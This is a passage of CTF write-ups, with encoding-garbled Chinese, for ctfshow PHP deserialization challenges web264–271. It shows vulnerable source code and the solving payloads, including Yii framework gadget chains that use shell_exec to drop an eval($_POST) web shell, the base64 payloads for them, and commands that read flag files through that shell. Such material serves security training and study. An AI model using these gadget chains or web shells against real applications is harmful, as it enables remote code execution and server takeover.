class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">message.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ²¡åŠæ³•ç›´æ¥æ”¹<code>Cookie</code>ï¼Œåªèƒ½ç”¨<code>web262</code>çš„å­—ç¬¦ä¸²é€ƒé€¸ï¼ŒåŒæ—¶è¦æ³¨æ„è®¾ç½®<code>Cookie</code>ä¸­çš„<code>msg</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br><span class="line">Cookie:</span><br><span class="line">msg=1</span><br></pre></td></tr></table></figure>

<h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŠŠ<code>token</code>çš„åœ°å€ä¼ ç»™<code>password</code>å³å¯ï¼Œè¿™æ ·<code>password</code>å°±ä¼šéšç€<code>token</code>ä¸€èµ·å˜åŒ–ï¼Œå§‹ç»ˆä¿æŒä¸€è‡´</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆ<code>payload</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ctfshow=O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>destructä¼šåœ¨è„šæœ¬ç»“æŸåé”€æ¯,è€ŒæŠ›å‡ºå¼‚å¸¸å¯¼è‡´æ— æ³•ç«‹å³æ‰§è¡Œdestruct,æ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œå¿«é€Ÿææ„</p>
<h3 id="åˆ é™¤æœ«å°¾"><a href="#åˆ é™¤æœ«å°¾" class="headerlink" title="åˆ é™¤æœ«å°¾}"></a>åˆ é™¤æœ«å°¾<code>&#125;</code></h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>4bffa75e-ec01-4ff2-88e0-c120e4095bec.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>73</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://4bffa75e-ec01-4ff2-88e0-c120e4095bec.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://4bffa75e-ec01-4ff2-88e0-c120e4095bec.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">O</span>:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;</span></span><br></pre></td></tr></table></figure>

<h3 id="ä¿®æ”¹å±æ€§ä¸ªæ•°"><a href="#ä¿®æ”¹å±æ€§ä¸ªæ•°" class="headerlink" title="ä¿®æ”¹å±æ€§ä¸ªæ•°"></a>ä¿®æ”¹å±æ€§ä¸ªæ•°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;ctfshow&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;&#125;</span><br><span class="line">O:7:&quot;ctfshow&quot;:2:&#123;&#125;</span><br><span class="line">O:7:&quot;Ctfshow&quot;:2:&#123;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ”¹å˜ç±»å"><a href="#æ”¹å˜ç±»å" class="headerlink" title="æ”¹å˜ç±»å"></a>æ”¹å˜ç±»å</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;Ctfshow&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h2><p>å¼±å£ä»¤ç™»å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>

<p><code>about</code>é¡µé¢æºç ä¸­å­˜åœ¨<code>&lt;!--?view-source --&gt;</code>ï¼Œæ•…è®¿é—®é¡µé¢<code>/index.php?r=site%2Fabout&amp;view-source</code>å¾—åˆ°ååºåˆ—åŒ–ç‚¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">///backdoor/shell</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>å†™ğŸè¿›å»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;shell_exec&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27; &gt; /var/www/html/basic/web/2.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆ<code>payload</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6MTA6InNoZWxsX2V4ZWMiO3M6MjoiaWQiO3M6NjM6ImVjaG8gJzw/cGhwIGV2YWwoJF9QT1NUWzFdKTs/PicgPiAvdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8yLnBocCI7fWk6MTtzOjM6InJ1biI7fX19fQ==</span><br></pre></td></tr></table></figure>

<p>è®¿é—®<code>2.php</code>å¹¶æ‰§è¡Œ<code>1=system(&#39;cat /flag&#39;);</code>å³å¯</p>
<h2 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h2><p>æ¢ä¸ªé“¾å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;shell_exec&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;echo &quot;&lt;?php eval(\$_POST[1]);?&gt;&quot; &gt; /var/www/html/basic/web/2.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc2</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    // ç”Ÿæˆ<span class="title class_">poc</span></span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>\<span class="title class_">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å†™ğŸè¿›å»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?r=backdoor/shell&amp;code=TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjk6ImlzUnVubmluZyI7YToyOntpOjA7TzoyMToieWlpXHJlc3RcQ3JlYXRlQWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo2NDoiZWNobyAiPD9waHAgZXZhbChcJF9QT1NUWzFdKTs/PiIgPiAvdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8yLnBocCI7fWk6MTtzOjM6InJ1biI7fX19fX0=</span><br></pre></td></tr></table></figure>

<p>è®¿é—®<code>2.php</code>å¹¶æ‰§è¡Œ<code>1=system(&quot;cat /flags&quot;);</code>å³å¯</p>
<h2 id="web269"><a href="#web269" class="headerlink" title="web269"></a>web269</h2><p>ç”¨è¿™ä¸ªé“¾å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &quot;<span class="title class_">echo</span> &#x27;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_POST</span>[1]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&#x27; &gt; /var/www/html/basic/web/1.php&quot;);</span></span><br><span class="line"><span class="string">    echo(base64_encode(serialize($exp)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å†™ğŸ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo3MzoiZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PicgPiAvdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8xLnBocCI7fWk6MTtzOjM6InJ1biI7fX19</span><br></pre></td></tr></table></figure>

<p>è®¿é—®<code>1.php</code>å¹¶æ‰§è¡Œ<code>1=system(&#39;cat /flagsa&#39;);</code>å³å¯</p>
<h2 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h2><p>å‰é¢æ­¥éª¤ä¸<code>web269</code>ä¸€è‡´ï¼Œæœ€åè®¿é—®<code>1.php</code>å¹¶æ‰§è¡Œ<code>1=system(&#39;cat /flagsaa&#39;);</code>å³å¯</p>
<h2 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h2><p>ç”¨è¿™ä¸ªé“¾å­ï¼ˆ<a target="_blank" rel="noopener" href="https://github.com/laravel/laravel/tree/5.7">é¡¹ç›®æºç </a>ï¼‰</p>
